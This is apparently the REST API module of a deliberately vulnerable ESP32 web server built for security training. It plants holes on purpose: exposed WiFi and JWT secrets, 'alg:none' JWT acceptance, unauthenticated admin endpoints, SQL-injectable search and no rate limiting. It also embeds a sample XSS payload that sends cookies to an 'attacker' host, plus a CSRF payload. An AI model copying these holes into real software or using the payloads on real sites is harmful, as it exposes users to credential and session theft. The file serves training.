/*
 * REST API Module
 * 
 * Provides RESTful API endpoints for system interaction.
 * Includes intentional vulnerabilities for training purposes.
 */

void setupRESTRoutes() {
  // Login endpoint
  server.on("/api/login", HTTP_POST, handleLogin);
  
  // Logout endpoint
  server.on("/api/logout", HTTP_GET, handleLogout);
  server.on("/api/logout", HTTP_POST, handleLogout);
  
  // System information endpoint
  server.on("/api/info", HTTP_GET, handleGetSystemInfo);
  
  // User management endpoints
  server.on("/api/users", HTTP_GET, handleGetUsers);
  server.on("/api/users", HTTP_POST, handlePostUser);
  server.on("/api/users", HTTP_DELETE, handleDeleteUser);
  server.on("/api/users", HTTP_PUT, handlePutUser);
  
  // Config endpoint (intentionally exposed)
  server.on("/api/config", HTTP_GET, [](AsyncWebServerRequest *request) {
    String clientIP = request->client()->remoteIP().toString();
    Serial.printf("[API] GET /api/config from %s\n", clientIP.c_str());
    totalRequests++;
    addCORSHeaders(request);
    
    if (!ENABLE_VULNERABILITIES) {
      request->send(403, "application/json", "{\"error\":\"Forbidden\"}");
      return;
    }
    
    Serial.printf("[API] ⚠️  Exposing credentials to %s\n", clientIP.c_str());
    
    DynamicJsonDocument doc(512);
    doc["wifi_ssid"] = WIFI_SSID_STR;
    doc["wifi_password"] = WIFI_PASSWORD_STR;  // Intentional exposure
    doc["jwt_secret"] = JWT_SECRET_STR;  // Intentional exposure
    doc["enable_vulnerabilities"] = ENABLE_VULNERABILITIES;
    doc["debug_mode"] = DEBUG_MODE;
    
    String output;
    serializeJson(doc, output);
    request->send(200, "application/json", output);
  });

  // JWT Debug endpoint - exposes token weaknesses
  server.on("/api/jwt-debug", HTTP_GET, [](AsyncWebServerRequest *request) {
    String clientIP = request->client()->remoteIP().toString();
    Serial.printf("[API] ⚠️  /api/jwt-debug accessed from %s\n", clientIP.c_str());
    totalRequests++;
    
    if (!ENABLE_VULNERABILITIES) {
      request->send(403, "application/json", "{\"error\":\"Forbidden\"}");
      return;
    }
    
    DynamicJsonDocument doc(1024);
    doc["vulnerability"] = "Weak JWT Implementation";
    doc["secret_key"] = JWT_SECRET_STR;
    doc["algorithm"] = VULN_WEAK_AUTH ? "none" : "HS256";
    doc["algorithm_note"] = "JWT accepts 'alg:none' when VULN_WEAK_AUTH enabled";
    doc["signature_validation"] = VULN_WEAK_AUTH ? "DISABLED" : "ENABLED";
    doc["example_token"] = generateJWT("admin", "admin");
    JsonArray hints = doc.createNestedArray("exploitation_hints");
    hints.add("1. Decode the JWT token (base64)");
    hints.add("2. Modify the payload (username, role, exp)");
    hints.add("3. Set algorithm to 'none' and remove signature");
    hints.add("4. Use token: header.payload.unsigned");
    hints.add("5. Or brute-force the weak secret: " + JWT_SECRET_STR);
    
    String output;
    serializeJson(doc, output);
    request->send(200, "application/json", output);
  });

  // Endpoint discovery API
  server.on("/api/endpoints", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] /api/endpoints discovery from %s\n", request->client()->remoteIP().toString().c_str());
    totalRequests++;
    
    DynamicJsonDocument doc(2048);
    JsonArray public_endpoints = doc.createNestedArray("public");
    public_endpoints.add("/");
    public_endpoints.add("/about");
    public_endpoints.add("/products");
    public_endpoints.add("/support");
    public_endpoints.add("/login");
    
    JsonArray api = doc.createNestedArray("api");
    api.add("/api/info");
    api.add("/api/login");
    api.add("/api/config");
    api.add("/api/users");
    api.add("/api/jwt-debug");
    api.add("/api/endpoints");
    api.add("/api/cookies/info");
    api.add("/api/admin/users-export");
    api.add("/api/admin/logs");
    api.add("/api/admin/sessions");
    api.add("/api/admin/config-update");
    api.add("/api/system/reboot");
    
    JsonArray vulns = doc.createNestedArray("vulnerabilities");
    vulns.add("/vuln/search");
    vulns.add("/vuln/comment");
    vulns.add("/vuln/download");
    vulns.add("/vuln/ping");
    vulns.add("/vuln/transfer");
    vulns.add("/vuln/user");
    vulns.add("/vuln/user-profile");
    vulns.add("/vuln/deserialize");
    
    JsonArray hidden = doc.createNestedArray("hidden");
    hidden.add("/debug");
    hidden.add("/.env");
    hidden.add("/.git/config");
    hidden.add("/backup");
    hidden.add("/robots.txt");
    
    doc["hint"] = "Try accessing endpoints without authentication";
    
    String output;
    serializeJson(doc, output);
    request->send(200, "application/json", output);
  });

  // Cookie security info endpoint
  server.on("/api/cookies/info", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] /api/cookies/info from %s\n", request->client()->remoteIP().toString().c_str());
    totalRequests++;
    
    DynamicJsonDocument doc(768);
    doc["vulnerability"] = "Insecure Cookie Configuration";
    JsonArray issues = doc.createNestedArray("issues");
    issues.add("No HttpOnly flag - vulnerable to XSS cookie theft");
    issues.add("No Secure flag - transmitted over HTTP");
    issues.add("No SameSite attribute - vulnerable to CSRF");
    issues.add("Predictable session IDs (based on millis())");
    issues.add("Long session timeout (1 hour) - token reuse window");
    issues.add("Session storage in memory - no persistence");
    
    JsonObject example = doc.createNestedObject("example_exploit");
    example["xss_steal"] = "<script>document.location='http://attacker/?c='+document.cookie</script>";
    example["csrf"] = "<img src='/vuln/transfer?to=attacker&amount=1000'>";
    
    doc["recommendation"] = "Use HttpOnly, Secure, SameSite=Strict flags";
    
    String output;
    serializeJson(doc, output);
    request->send(200, "application/json", output);
  });

  // Hidden admin endpoint - user export (NO AUTH CHECK)
  server.on("/api/admin/users-export", HTTP_GET, [](AsyncWebServerRequest *request) {
    String clientIP = request->client()->remoteIP().toString();
    Serial.printf("[API] ⚠️  CRITICAL: /api/admin/users-export accessed WITHOUT AUTH from %s\n", clientIP.c_str());
    totalRequests++;
    
    // Intentionally NO authentication check - broken access control
    String csv = "id,username,password,role,email\n";
    for (int i = 0; i < DEFAULT_USERS_COUNT; i++) {
      csv += String(i+1) + ",";
      csv += defaultUsers[i].username + ",";
      csv += defaultUsers[i].password + ",";
      csv += defaultUsers[i].role + ",";
      csv += defaultUsers[i].username + "@securenet-solutions.local\n";
    }
    
    AsyncWebServerResponse *response = request->beginResponse(200, "text/csv", csv);
    response->addHeader("Content-Disposition", "attachment; filename=\"users_export.csv\"");
    request->send(response);
  });

  // Hidden admin endpoint - logs (NO AUTH CHECK)
  server.on("/api/admin/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] ⚠️  /api/admin/logs accessed from %s\n", request->client()->remoteIP().toString().c_str());
    totalRequests++;
    
    String logs = readFile(LOG_FILE_PATH);
    if (logs == "") {
      logs = "[2024-11-15 14:23:01] System started\n";
      logs += "[2024-11-15 14:23:15] Admin login successful from 192.168.4.2\n";
      logs += "[2024-11-15 14:25:42] Failed login attempt: root from 192.168.4.5\n";
      logs += "[2024-11-15 14:27:33] Config accessed from 192.168.4.2\n";
      logs += "[2024-11-15 15:12:09] JWT secret exposed via /debug\n";
    }
    request->send(200, "text/plain", logs);
  });

  // Admin sessions viewer
  server.on("/api/admin/sessions", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] /api/admin/sessions from %s\n", request->client()->remoteIP().toString().c_str());
    totalRequests++;
    
    DynamicJsonDocument doc(2048);
    doc["active_sessions"] = activeSessions.size();
    JsonArray sessions = doc.createNestedArray("sessions");
    
    for (auto& pair : activeSessions) {
      JsonObject sess = sessions.createNestedObject();
      sess["session_id"] = pair.first;
      sess["username"] = pair.second.username;
      sess["role"] = pair.second.role;
      sess["ip_address"] = pair.second.ipAddress;
      sess["created_at"] = pair.second.createdAt;
      sess["last_activity"] = pair.second.lastActivity;
    }
    
    String output;
    serializeJson(doc, output);
    request->send(200, "application/json", output);
  });

  // Admin config update (dangerous endpoint)
  server.on("/api/admin/config-update", HTTP_POST, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] ⚠️  /api/admin/config-update from %s\n", request->client()->remoteIP().toString().c_str());
    totalRequests++;
    
    // Weak auth check
    if (!isAuthenticated(request)) {
      request->send(401, "application/json", "{\"error\":\"Unauthorized\"}");
      return;
    }
    
    if (request->hasParam("wifi_ssid", true)) {
      WIFI_SSID_STR = request->getParam("wifi_ssid", true)->value();
      Serial.printf("[API] WiFi SSID changed to: %s\n", WIFI_SSID_STR.c_str());
    }
    
    if (request->hasParam("jwt_secret", true)) {
      JWT_SECRET_STR = request->getParam("jwt_secret", true)->value();
      Serial.printf("[API] JWT secret changed!\n");
    }
    
    request->send(200, "application/json", "{\"success\":true,\"message\":\"Config updated\"}");
  });

  // System reboot endpoint (DOS vulnerability)
  server.on("/api/system/reboot", HTTP_POST, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] ⚠️  CRITICAL: System reboot requested from %s\n", request->client()->remoteIP().toString().c_str());
    totalRequests++;
    
    if (!ENABLE_VULNERABILITIES) {
      request->send(403, "application/json", "{\"error\":\"Forbidden\"}");
      return;
    }
    
    logWarning("[VULNERABILITY] Reboot endpoint called - DOS possible!");
    request->send(200, "application/json", "{\"message\":\"System will reboot in 5 seconds\",\"hint\":\"No authentication required!\"}");
    
    delay(5000);
    ESP.restart();
  });

  // Rate limiting test endpoint
  server.on("/api/auth/bruteforce-test", HTTP_POST, [](AsyncWebServerRequest *request) {
    Serial.printf("[API] /api/auth/bruteforce-test from %s\n", request->client()->remoteIP().toString().c_str());
    
    if (!ENABLE_VULNERABILITIES) {
      request->send(403, "application/json", "{\"error\":\"Forbidden\"}");
      return;
    }
    
    String username = "";
    String password = "";
    
    if (request->hasParam("username", true)) {
      username = request->getParam("username", true)->value();
    }
    if (request->hasParam("password", true)) {
      password = request->getParam("password", true)->value();
    }
    
    Serial.printf("[API] ⚠️  No rate limiting! Attempt %d for user: %s\n", failedLoginAttempts, username.c_str());
    
    bool result = authenticateUser(username, password);
    DynamicJsonDocument doc(256);
    doc["attempt"] = failedLoginAttempts;
    doc["success"] = result;
    doc["hint"] = "No rate limiting - brute force possible!";
    doc["try"] = "curl -X POST -d 'username=admin&password=admin123' http://" + getLocalIP() + "/api/auth/bruteforce-test";
    
    String output;
    serializeJson(doc, output);
    request->send(result ? 200 : 401, "application/json", output);
  });
  
  Serial.println("[API] REST routes configured");
}

void handleGetSystemInfo(AsyncWebServerRequest *request) {
  String clientIP = request->client()->remoteIP().toString();
  Serial.printf("[API] GET /api/info from %s\n", clientIP.c_str());
  totalRequests++;
  addCORSHeaders(request);
  
  DynamicJsonDocument doc(1024);
  doc["version"] = "1.0.0";
  doc["uptime"] = millis() / 1000;
  doc["free_heap"] = ESP.getFreeHeap();
  doc["chip_model"] = ESP.getChipModel();
  doc["chip_revision"] = ESP.getChipRevision();
  doc["cpu_freq"] = ESP.getCpuFreqMHz();
  doc["flash_size"] = ESP.getFlashChipSize();
  doc["flash_speed"] = ESP.getFlashChipSpeed();
  
  // WiFi info
  JsonObject wifi = doc.createNestedObject("wifi");
  wifi["ip"] = getLocalIP();
  wifi["mac"] = WiFi.macAddress();
  wifi["ssid"] = WiFi.SSID();
  wifi["rssi"] = WiFi.RSSI();
  wifi["mode"] = STATION_MODE ? "Station" : "AP";
  
  // Server info
  JsonObject server_info = doc.createNestedObject("server");
  server_info["active_connections"] = activeConnections;
  server_info["total_requests"] = totalRequests;
  server_info["active_sessions"] = activeSessions.size();
  server_info["vulnerabilities_enabled"] = ENABLE_VULNERABILITIES;
  
  String output;
  serializeJson(doc, output);
  
  sendJSONResponse(request, 200, output);
}

void handleGetUsers(AsyncWebServerRequest *request) {
  String clientIP = request->client()->remoteIP().toString();
  Serial.printf("[API] GET /api/users from %s\n", clientIP.c_str());
  totalRequests++;
  addCORSHeaders(request);
  
  // Intentional vulnerability: No authentication check in vulnerable mode
  if (!VULN_WEAK_AUTH && !isAuthenticated(request)) {
    Serial.printf("[API] /api/users access denied - not authenticated\n");
    sendJSONResponse(request, 401, "{\"error\":\"Unauthorized\"}");
    return;
  }
  
  // Check for search parameter (vulnerable to SQL injection)
  if (request->hasParam("search")) {
    String searchTerm = request->getParam("search")->value();
    Serial.printf("[API] ⚠️  SQL query search: %s\n", searchTerm.c_str());
    String result = selectQuery(searchTerm);  // Vulnerable query
    sendJSONResponse(request, 200, result);
    return;
  }
  
  String users = getAllUsers();
  sendJSONResponse(request, 200, users);
}

void handlePostUser(AsyncWebServerRequest *request) {
  String clientIP = request->client()->remoteIP().toString();
  Serial.printf("[API] POST /api/users from %s\n", clientIP.c_str());
  totalRequests++;
  addCORSHeaders(request);
  
  // Check authentication
  if (!isAuthenticated(request)) {
    Serial.printf("[API] POST /api/users denied - not authenticated\n");
    sendJSONResponse(request, 401, "{\"error\":\"Unauthorized\"}");
    return;
  }
  
  // Parse parameters
  String username = "";
  String password = "";
  String role = "guest";
  
  if (request->hasParam("username", true)) {
    username = request->getParam("username", true)->value();
  }
  if (request->hasParam("password", true)) {
    password = request->getParam("password", true)->value();
  }
  if (request->hasParam("role", true)) {
    role = request->getParam("role", true)->value();
  }
  
  if (username == "" || password == "") {
    sendJSONResponse(request, 400, "{\"error\":\"Missing required fields\"}");
    return;
  }
  
  // Intentional vulnerability: No password complexity check
  if (insertUser(username, password, role)) {
    DynamicJsonDocument doc(256);
    doc["success"] = true;
    doc["message"] = "User created successfully";
    doc["username"] = username;
    
    String output;
    serializeJson(doc, output);
    sendJSONResponse(request, 201, output);
  } else {
    sendJSONResponse(request, 400, "{\"error\":\"Failed to create user\"}");
  }
}

void handleDeleteUser(AsyncWebServerRequest *request) {
  totalRequests++;
  addCORSHeaders(request);
  
  // Intentional vulnerability: Missing CSRF protection
  if (!VULN_CSRF && !isAuthenticated(request)) {
    sendJSONResponse(request, 401, "{\"error\":\"Unauthorized\"}");
    return;
  }
  
  String username = "";
  if (request->hasParam("username")) {
    username = request->getParam("username")->value();
  }
  
  if (username == "") {
    sendJSONResponse(request, 400, "{\"error\":\"Missing username\"}");
    return;
  }
  
  if (deleteUser(username)) {
    DynamicJsonDocument doc(128);
    doc["success"] = true;
    doc["message"] = "User deleted";
    
    String output;
    serializeJson(doc, output);
    sendJSONResponse(request, 200, output);
  } else {
    sendJSONResponse(request, 404, "{\"error\":\"User not found\"}");
  }
}

void handlePutUser(AsyncWebServerRequest *request) {
  totalRequests++;
  addCORSHeaders(request);
  
  if (!isAuthenticated(request)) {
    sendJSONResponse(request, 401, "{\"error\":\"Unauthorized\"}");
    return;
  }
  
  String username = "";
  String newPassword = "";
  String newRole = "";
  
  if (request->hasParam("username", true)) {
    username = request->getParam("username", true)->value();
  }
  if (request->hasParam("password", true)) {
    newPassword = request->getParam("password", true)->value();
  }
  if (request->hasParam("role", true)) {
    newRole = request->getParam("role", true)->value();
  }
  
  if (username == "") {
    sendJSONResponse(request, 400, "{\"error\":\"Missing username\"}");
    return;
  }
  
  if (updateUser(username, newPassword, newRole)) {
    sendJSONResponse(request, 200, "{\"success\":true,\"message\":\"User updated\"}");
  } else {
    sendJSONResponse(request, 404, "{\"error\":\"User not found\"}");
  }
}

void sendJSONResponse(AsyncWebServerRequest *request, int code, String json) {
  AsyncWebServerResponse *response = request->beginResponse(code, "application/json", json);
  response->addHeader("Access-Control-Allow-Origin", "*");
  response->addHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  response->addHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  request->send(response);
}
